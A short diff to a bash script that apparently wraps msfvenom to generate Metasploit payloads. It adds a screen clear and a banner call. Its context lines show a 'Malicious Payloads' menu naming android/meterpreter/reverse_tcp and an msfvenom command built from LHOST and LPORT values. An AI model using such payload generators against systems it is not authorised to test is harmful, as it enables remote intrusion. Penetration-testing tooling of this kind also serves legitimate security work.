@@ -1,5 +1,8 @@
 #!/bin/bash
 
+clear
+f_banner
+
 echo -e "${BLUE}Malicious Payloads${NC}"
 echo
 echo "1.   android/meterpreter/reverse_tcp"
@@ -129,3 +132,4 @@ msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $p
 
 echo
 echo
+
